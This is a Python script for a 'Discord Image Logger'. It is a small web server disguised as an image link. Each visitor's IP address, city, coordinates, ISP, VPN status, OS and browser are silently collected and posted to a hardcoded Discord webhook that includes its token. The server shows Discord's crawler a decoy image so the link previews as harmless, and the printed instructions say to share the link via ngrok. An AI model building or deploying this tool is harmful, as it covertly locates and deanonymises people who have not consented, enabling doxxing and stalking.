# Discord Image Logger - Phone & PC Compatible
# By Tim$erz | https://github.com/timzz71

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import json, re

__app__ = "Discord Image Logger"
__version__ = "v2.0"
__author__ = "Tim$erz"

config = {
    # ⚠️ PASTE YOUR WEBHOOK URL HERE ⚠️
    "webhook": "https://discord.com/api/webhooks/1542691542807085098/tx_7D0GCqfYhVzqlgOs-67dCkqb46bOE3NINz7LtlLxKH0nZIIJrTT0xT9npO4hnKlWh",
    
    # The image shown when someone opens the link
    "image": "https://cdn.pfps.gg/pfps/3025-cool-spiderman.png",
    
    "username": "Image Logger",
    "color": 0x00FFFF,
    "buggedImage": True,
}

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,as,lat,lon,timezone,mobile,proxy,hosting")
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return data
    except:
        pass
    return None

def get_device_type(user_agent):
    user_agent = user_agent.lower()
    if 'mobile' in user_agent or 'android' in user_agent or 'iphone' in user_agent:
        return '📱 Mobile'
    elif 'tablet' in user_agent or 'ipad' in user_agent:
        return '📱 Tablet'
    else:
        return '💻 Desktop'

def send_to_webhook(ip, user_agent, info, endpoint="/", image_url=None):
    if not config["webhook"]:
        return
    
    os_name = "Unknown"
    browser_name = "Unknown"
    try:
        if user_agent:
            os_name, browser_name = httpagentparser.simple_detect(user_agent)
    except:
        pass
    
    device = get_device_type(user_agent)
    
    description = "**A User Opened the Image!**\n\n"
    description += f"**Device:** `{device}`\n"
    description += f"**Endpoint:** `{endpoint}`\n\n"
    description += "**🌐 IP Information:**\n"
    description += f"> **IP:** `{ip}`\n"
    description += f"> **ISP:** `{info.get('isp', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Country:** `{info.get('country', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Region:** `{info.get('regionName', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **City:** `{info.get('city', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Coordinates:** `{info.get('lat', 'N/A') if info else 'N/A'}, {info.get('lon', 'N/A') if info else 'N/A'}`\n"
    description += f"> **VPN/Proxy:** `{info.get('proxy', 'Unknown') if info else 'Unknown'}`\n\n"
    description += "**💻 Device Information:**\n"
    description += f"> **OS:** `{os_name}`\n"
    description += f"> **Browser:** `{browser_name}`\n"
    description += f"> **User Agent:**\n"
    description += f"```\n{user_agent[:200]}\n```"
    
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "📡 Image Logger - IP Logged",
                "color": config["color"],
                "description": description,
                "footer": {"text": "Discord Image Logger v2.0"},
                "timestamp": "2024-01-01T00:00:00Z"
            }
        ]
    }
    
    if config["image"]:
        embed["embeds"][0]["thumbnail"] = {"url": config["image"]}
    
    try:
        response = requests.post(config["webhook"], json=embed)
        print(f"[+] Webhook sent! Status: {response.status_code}")
    except Exception as e:
        print(f"[!] Error sending webhook: {e}")

# Loading image for Discord preview
LOADING_IMAGE = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        try:
            # Get real IP
            forwarded_for = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
            if not forwarded_for or forwarded_for == '127.0.0.1':
                forwarded_for = self.client_address[0]
            
            user_agent = self.headers.get('user-agent', '')
            path = self.path.split("?")[0]
            
            print(f"[+] Request: {path} from IP: {forwarded_for}")
            
            # Send webhook for ALL requests (except favicon)
            if path != '/favicon.ico':
                info = get_ip_info(forwarded_for)
                send_to_webhook(forwarded_for, user_agent, info, path, config["image"])
            
            # Handle requests
            if path == '/favicon.ico':
                self.send_response(204)
                self.end_headers()
                return
            
            # Check if Discord crawler
            if 'discord' in user_agent.lower() or forwarded_for.startswith(("34", "35")):
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(LOADING_IMAGE)
                return
            
            # Serve the image for EVERYONE (phones, computers, etc.)
            image_url = config["image"]
            
            # If it's a phone, redirect to the actual image
            if 'mobile' in user_agent.lower() or 'android' in user_agent.lower() or 'iphone' in user_agent.lower():
                self.send_response(302)
                self.send_header('Location', image_url)
                self.end_headers()
                return
            
            # For desktop: show HTML with image
            html = f'''<!DOCTYPE html>
<html>
<head>
    <meta property="og:image" content="{image_url}">
    <meta property="og:title" content="Image Logger">
    <meta property="og:description" content="Loading image...">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Logger</title>
    <style>
        body {{ margin: 0; padding: 0; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }}
        img {{ max-width: 100%; max-height: 100%; object-fit: contain; }}
    </style>
</head>
<body>
    <img src="{image_url}" alt="Image">
</body>
</html>'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            
        except Exception as e:
            print(f"[!] Error: {e}")
            traceback.print_exc()
            self.send_response(500)
            self.end_headers()
    
    def do_POST(self):
        self.do_GET()

def run_server():
    port = 8080
    server = HTTPServer(('', port), ImageLoggerAPI)
    print("=" * 60)
    print("  🖼️ DISCORD IMAGE LOGGER (Phone + PC Compatible)")
    print("=" * 60)
    print(f"[+] Server started on http://localhost:{port}")
    print("[+] Press Ctrl+C to stop")
    print("=" * 60)
    print("\n📨 SHARE THIS LINK ON DISCORD:")
    print("   http://localhost:{port}/")
    print("\n🌍 WITH NGROK:")
    print("   ngrok http 8080")
    print("   Then share: https://your-ngrok-url.ngrok.io/")
    print("=" * 60)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] Server stopped.")
        server.server_close()

if __name__ == "__main__":
    run_server()
